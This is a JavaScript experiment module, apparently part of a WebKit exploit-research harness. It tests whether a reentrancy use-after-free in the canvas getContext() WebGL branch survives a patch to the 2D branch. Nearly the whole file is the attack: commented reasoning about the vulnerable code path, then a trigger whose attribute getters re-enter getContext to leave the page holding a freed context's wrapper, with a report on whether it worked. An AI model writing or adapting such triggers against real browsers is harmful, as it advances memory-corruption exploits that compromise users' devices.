// gl584: the reentrancy window on the WebGL branch of getContext().
//
// The document-canvas 2D trigger (uaf584) is guarded on the shipped engine:
// uaf584-attrs reported the inner context's attributes (desynchronized:false)
// although the outer getter asked for true, and uaf584-attrs-control showed
// the same read returning true on the ordinary path. So the 2D branch
// re-checks m_context after the dictionary conversion.
//
// WebGL is a separate branch of the same function, with a separate dictionary
// (WebGLContextAttributes) and a separate create call:
//
//     if (m_context) return m_context;                    // entry check
//     attributes = convert<IDLDictionary<WebGLContextAttributes>>(arguments[0]);
//     createContextWebGL(version, attributes);            // releases the old
//
// If the shipped guard sits inside the 2D branch only, a getter here re-enters,
// installs a WebGL context, and the outer call then drops it while the page
// still holds the wrapper.
//
// The getter asks for preserveDrawingBuffer:true (default false), so one read
// answers which context the outer call returned:
//
//   preserveDrawingBuffer true  -> the outer call built a new context
//   preserveDrawingBuffer false -> it returned the inner one (guarded)
//
// Queue with:
//   sudo node tools/experiment.mjs enqueue gl584 --label gl584-1
(function () {
  'use strict';
  if (typeof Ns2Webkit === 'undefined' || !Ns2Webkit.registerExperiment)
    throw new Error('gl584: Ns2Webkit.registerExperiment is missing');

  function attrsOf(context) {
    if (!context) return 'null';
    try {
      return JSON.stringify(context.getContextAttributes());
    } catch (error) {
      return 'threw ' + error;
    }
  }

  function makeCanvas() {
    var canvas = document.createElement('canvas');
    canvas.width = 64;
    canvas.height = 64;
    return canvas;
  }

  Ns2Webkit.registerExperiment({
    name: 'gl584',
    description: 'webgl getContext reentrancy: is the 2D guard branch-specific?',
    run: function (params) {
      var report = {
        supported: false,
        reentered: false,
        stale: false,
        outerSame: null,
        cachedSame: null,
        outerAttrs: null,
        staleAttrs: null,
        innerPdb: null,
        out: 'not-run'
      };

      // Support check on a canvas of its own, so the trigger canvas starts
      // without a context.
      try {
        report.supported = !!makeCanvas().getContext('webgl');
      } catch (error) {
        report.out = 'webgl probe threw ' + error;
        return report;
      }
      if (!report.supported) {
        report.out = 'webgl unavailable';
        return report;
      }

      var canvas = makeCanvas();
      var stale = null;
      var outer = null;
      var reentered = false;

      function reenter() {
        if (reentered) return;
        reentered = true;
        try {
          stale = canvas.getContext('webgl');
        } catch (error) {
          report.out = 'inner getContext threw ' + error;
        }
      }

      try {
        outer = canvas.getContext('webgl', {
          get preserveDrawingBuffer() { reenter(); return true; },
          get alpha() { reenter(); return true; },
          get depth() { reenter(); return true; },
          get stencil() { reenter(); return false; },
          get antialias() { reenter(); return true; },
          get premultipliedAlpha() { reenter(); return true; }
        });
      } catch (error) {
        report.out = 'outer getContext threw ' + error;
      }

      report.reentered = reentered;
      report.stale = !!stale;
      report.outerSame = (outer === stale);
      if (stale) {
        try {
          report.cachedSame = (canvas.getContext('webgl') === stale);
        } catch (error) {
          report.cachedSame = 'threw ' + error;
        }
        try {
          report.innerPdb = stale.getContextAttributes().preserveDrawingBuffer;
        } catch (error) {
          report.innerPdb = 'threw ' + error;
        }
      }
      report.outerAttrs = attrsOf(outer);
      report.staleAttrs = attrsOf(stale);
      report.out = 'same=' + report.outerSame + ' cached=' + report.cachedSame
        + ' outer=' + report.outerAttrs + ' stale=' + report.staleAttrs;
      return report;
    }
  });
})();
